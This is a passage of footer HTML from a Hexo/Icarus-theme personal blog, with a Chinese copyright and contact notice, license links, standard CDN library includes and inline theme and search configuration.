方便于网友与自己学习交流，如有侵权，请<a href="https://zronghui.github.io/message/" target="_blank">留言</a>，立即处理]<br><script type="text/javascript" src="/js/statistics.js"></script><span id="statistic-times"></span><br></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/zronghui"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script>moment.locale("zh-Hans");</script><script>var IcarusThemeSettings = {
+            site: {
+                url: 'https://zronghui.github.io',
+                external_link: {"enable":true,"exclude":[]}
+            },
+            article: {
+                highlight: {
+                    clipboard: true,
+                    fold: 'unfolded'
+                }
+            }
+        };</script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back-to-top.js" defer></script><!--!--><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script><script src="/js/gallery.js" defer></script><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><script src="/js/comment-issue-data.js" defer></script><link rel="stylesheet" href="/css/insight.css"><div class="searchbox ins-search"><div class="searchbox-container ins-search-container"><div class="searchbox-input-wrapper"><input class="searchbox-input ins-search-input" type="text" placeholder="想要查找什么..."><span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span></div><div class="searchbox-result-wrapper ins-section-wrapper"><div class="ins-section-container"></div></div></div></div><script>(function (window) {
+            var INSIGHT_CONFIG = {
+                TRANSLATION: {
+                    POSTS: '文章',
+                    PAGES: '页面',
+                    CATEGORIES: '分类',
+                    TAGS: '标签',
+                    UNTITLED: '(无标题)',
+                },
+                CONTENT_URL: '/content.json',
+            };
+            window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+        })(window);</script><script src="/js/insight.js" defer></script></body></html>
